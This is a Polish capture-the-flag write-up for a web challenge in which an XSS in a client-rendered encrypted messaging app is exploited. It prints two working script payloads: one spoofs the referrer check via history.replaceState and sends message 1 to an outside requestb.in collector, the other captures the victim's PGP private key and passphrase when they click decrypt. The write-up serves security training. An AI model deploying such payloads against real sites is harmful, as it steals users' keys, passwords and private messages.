# Zadanie 2 - web duże

## Useful tools

https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/

https://github.com/internetwache/GitTools

## Link do zadania

https://hard.web.uw2017.p4.team

## Write-up

### Ogólna idea

Wiadomość jest szyfrowana po stronie użytkownika, zatem możliwe jest wysłanie
dowolnej wiadomości, a ponieważ zaszyfrowana wiadomość nie jest escapowana i
jest renderowana po stronie klienta to możliwy jest atak XSS

Wystarczy wysłać do admina dwie odpowiednio spreparowane wiadomości
i liczyć na to że je otworzy i spróbuje odszyfrować
(w sumie można to zrobić też w jednej wiadomości...)

Oczywiście chodzi tu o wyciągnięcie klucza prywatnego oraz wiadmości o id 1


### Wyciąganie wiadomości

Należy wykonać po stronie klienta zapytanie które pobierze wiadomość.
Jesteśmy cały czas w tej samej domenie więc SOP na to pozwala.

Następnie możemy wysłać tą wiadomość na własny serwer (SOP pozwala na wysłanie
zapytania, nie pozwoli tylko na odczytanie odpowiedzi serwera u atakowanej ofiary,
ale to bez znaczenia)

Wszystko byłoby łatwe, gdyby nie to, że serwer ma dodatkowe zabezpieczenie
przed atakiem CSRF i nie pozwala wejść na stronę wiadomości ze stron innych
niż `/list_messages`.

Na szczeście jest na to sposób
```
window.history.replaceState({}, "Hello", '/list_messages')
```

Po wykonaniu tej komendy serwer będzie myślał, że zapytanie pochodzi ze strony
`/list_messages` i oto mamy dostęp do wiadomości

Cała wiadomość:

```
<script>
window.history.replaceState({}, "Hello", '/list_messages')

$.ajax({
    url: "/read_message/1",
}).then(function(data) {
    $.post({
        url: "https://requestb.in/158azuq1",
        data: {
            message: data
        }
    })
});
</script>
```

### Wyciąganie klucza prywatnego

Klucz prywatny nie jest trzymany nigdzie na serwerze. Dlatego to użytkownik
musi sam go nam wysłać. Jak go do tego zachęcić? Spreparować tak wiadomość,
aby przy próbie odszyfrowania odczytała wklejony w odpowiednie pole klucz
i wysłała go na nasz serwer

Cała wiadomość:

```
<script>
$(function() {
    var privkey = document.getElementById("privkey");
    var user_pass = document.getElementById("pgp-pass");

    document.getElementById('decrypt-button').onclick = function() {
        $.post({
            url: "https://requestb.in/158azuq1",
            data: {
                privKey: privkey.value.trim(),
                userPass: user_pass.value
            }
        })
    };
});
</script>
```

### Flagi

Flaga z wiadomości: `UW2017{Mess with the best, die like the rest.}`

Flaga z klucza prywatnego: `UW2017{One small XSS for man...}`
